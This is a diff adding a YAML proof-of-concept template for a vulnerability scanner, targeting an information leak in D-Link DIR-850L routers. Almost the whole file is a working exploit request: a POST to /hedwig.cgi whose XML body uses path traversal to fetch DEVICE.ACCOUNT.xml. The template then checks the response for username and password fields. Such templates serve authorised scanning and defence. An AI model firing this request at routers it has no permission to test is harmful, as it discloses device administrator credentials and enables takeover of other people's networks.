@@ -1,0 +1,23 @@
+detail:
+  Affected Version: Dir-850L
+  author: cc_ci(https://github.com/cc8ci)
+  links:
+  - https://xz.aliyun.com/t/2941
+expression: r0()
+manual: true
+name: poc-yaml-dlink-850l-info-leak
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("xml") &&
+      response.body.bcontains(b"</usrid>") && response.body.bcontains(b"</password>")
+      && response.body.bcontains(b"<result>OK</result>")
+    request:
+      body: <?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>
+      cache: true
+      follow_redirects: false
+      headers:
+        Content-Type: text/xml
+        Cookie: uid=R8tBjwtFc8
+      method: POST
+      path: /hedwig.cgi
+transport: http
